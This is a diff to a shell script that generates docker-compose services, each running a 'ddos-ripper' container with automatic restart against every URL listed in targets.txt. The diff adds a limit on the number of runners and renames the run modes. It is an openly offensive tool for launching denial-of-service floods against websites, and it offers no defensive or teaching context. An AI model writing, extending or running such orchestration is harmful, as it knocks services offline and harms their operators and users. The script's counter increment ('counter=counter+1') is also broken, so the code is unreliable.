@@ -45,17 +45,19 @@ generate_compose_light () {
 
 generate_compose () {
   echo "version: '3'" > docker-compose.yml
-    echo "services:" >> docker-compose.yml
-    counter=1
-    while read -r site_url; do
-        if [ ! -z $site_url ]; then
-            echo "  ddos-runner-$counter:" >> docker-compose.yml
-            echo "    image: nitupkcuf/ddos-ripper:latest" >> docker-compose.yml
-            echo "    restart: always" >> docker-compose.yml
-            echo "    command: $site_url" >> docker-compose.yml
-            counter=counter+1
-        fi
-    done < targets.txt
+  echo "services:" >> docker-compose.yml
+  counter=1
+  while read -r site_url; do
+    if [ $counter -le $amount ]; then
+      if [ ! -z $site_url ]; then
+        echo "  ddos-runner-$counter:" >> docker-compose.yml
+        echo "    image: nitupkcuf/ddos-ripper:latest" >> docker-compose.yml
+        echo "    restart: always" >> docker-compose.yml
+        echo "    command: $site_url" >> docker-compose.yml
+        counter=counter+1
+      fi
+    fi
+  done < targets.txt
 }
 
 ripper_start () {
@@ -97,11 +99,11 @@ check_dependencies
 check_params
 
 case $MODE in
-  install)
+  full)
     generate_compose
     ripper_start
     ;;
-  light_install)
+  light)
     generate_compose_light
     ripper_start
   ;;
